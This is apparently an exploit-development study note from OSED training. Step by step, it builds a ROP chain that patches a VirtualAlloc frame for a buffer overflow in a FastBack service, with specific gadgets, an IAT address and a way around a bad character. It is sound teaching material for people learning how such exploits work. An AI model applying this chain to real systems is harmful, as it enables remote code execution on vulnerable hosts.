# Lesson Capture 004 — Constructing the VirtualAlloc Frame

## Context

The OSED example uses a vulnerable FastBack service and a controlled stack. The chain begins with dummy DWORDs embedded in the overflow buffer:

```text
SKELETON+00  0x45454545  dummy VirtualAlloc address
SKELETON+04  0x46464646  dummy return address
SKELETON+08  0x00000000  corrupted lpAddress placeholder
SKELETON+0C  0x48484848  dummy size
SKELETON+10  0x00000000  corrupted allocation type placeholder
SKELETON+14  0x51515151  dummy protection
```

At the access violation, `ESP` points into the ROP area, not at the first skeleton DWORD. In the observed layout the skeleton begins `0x1C` bytes before the current `ESP`.

## Phase 1 — copy the stack pointer

Gadget:

```asm
push esp
push eax
pop edi
pop esi
ret
```

Let the initial stack pointer be `S` and the initial `EAX` be `A`.

Step by step:

```text
push esp:
ESP = S-4
[S-4] = S

push eax:
ESP = S-8
[S-8] = A

pop edi:
EDI = A
ESP = S-4

pop esi:
ESI = S
ESP = S

ret:
EIP = [S]
ESP = S+4
```

The useful contract is:

```text
Output: ESI = original ESP
Clobber: EDI
```

The next DWORD on the controlled stack selects the next gadget.

## Phase 2 — calculate the skeleton address

There is no convenient `SUB ESI,1C; RET`, and sending `0x0000001C` would include null bytes. Use the two's-complement value:

```text
-0x1C = 0xFFFFFFE4
```

Gadgets:

```asm
mov eax, esi
pop esi
ret

pop ecx
ret

add eax, ecx
ret

push eax
pop esi
ret
```

Ledger:

| Point | EAX | ECX | ESI |
|---|---|---|---|
| after copy-ESP gadget | unknown | unknown | `S` |
| after `mov eax,esi` | `S` | unknown | junk (side effect) |
| after `pop ecx` | `S` | `0xFFFFFFE4` | junk |
| after `add eax,ecx` | `S-0x1C` | `-0x1C` | junk |
| after `push eax; pop esi` | `S-0x1C` | `-0x1C` | `S-0x1C` |

Now `ESI` points at `SKELETON+00`.

## Phase 3 — resolve the API

The module imports `VirtualAlloc`. The IAT entry address is stable relative to the loaded module, while the pointer stored there changes with ASLR.

Known IAT entry:

```text
0x5054A220
```

The byte `0x20` is a bad character. Place the safe nearby value `0x5054A221` in the input, then correct it at runtime:

```asm
pop eax
ret                 ; EAX = 0x5054A221

pop ecx
ret                 ; ECX = 0xFFFFFFFF (-1)

add eax, ecx
ret                 ; EAX = 0x5054A220

mov eax, [eax]
ret                 ; EAX = *IAT = VirtualAlloc
```

The brackets perform the second step: the first value is the IAT slot address; dereferencing reads the resolved API pointer.

## Phase 4 — patch the first field

With:

```text
ESI = SKELETON+00
EAX = VirtualAlloc
```

execute:

```asm
mov [esi], eax
ret
```

Result:

```text
[SKELETON+00] = VirtualAlloc
ESI            = SKELETON+00
```

The pointer is preserved; only the pointed-to DWORD changes.

## Phase 5 — move to the return slot

The next target is `SKELETON+04`. Conceptually:

```text
ESI = ESI + 4
```

A direct `ADD ESI,4; RET` may not exist. Compose it using a constant and an add gadget:

```asm
pop ecx
ret                 ; ECX = 4
add esi, ecx
ret
```

Now:

```text
ESI = &ReturnAddress
```

The value to write is the shellcode address, not `ESI+4`. This distinction was explicitly corrected during the lesson: the destination is where to write; the source is what to write.

## Phase 6 — derive shellcode address

If shellcode follows a six-DWORD frame, the frame occupies:

```text
6 * 4 = 24 bytes = 0x18
```

If `ESI` currently points to the return slot at `SKELETON+04`, the shellcode begins at:

```text
ESI + (0x18 - 4) = ESI + 0x14
```

The actual exploit may include padding or a NOP sled, so the constant must come from the concrete buffer layout. The invariant is:

```text
shellcode_address = known_pointer + fixed_offset
```

Preserve `ESI` as the destination while computing the source in another register (for example, copy `ESI` to `EAX` or `ECX`, add the offset, then write through `ESI`).

## Complete conceptual algorithm

```text
1. ESI = original ESP
2. EAX = ESI
3. ECX = -0x1C
4. EAX = EAX + ECX
5. ESI = EAX                     ; frame pointer
6. EAX = safe IAT address
7. EAX = EAX - 1                ; exact IAT slot
8. EAX = [EAX]                  ; VirtualAlloc
9. [ESI] = EAX                  ; patch API field
10. ESI = ESI + 4              ; return slot
11. compute payload address
12. [ESI] = payload address
```

## Exercises

- Recompute `S-0x1C` using signed and unsigned notation.
- Label which instructions change a pointer and which write through a pointer.
- Mark every gadget that consumes an extra junk DWORD.
- Draw the skeleton before and after patching the first field.
- Explain why `0x5054A221` is transmitted instead of `0x5054A220`.
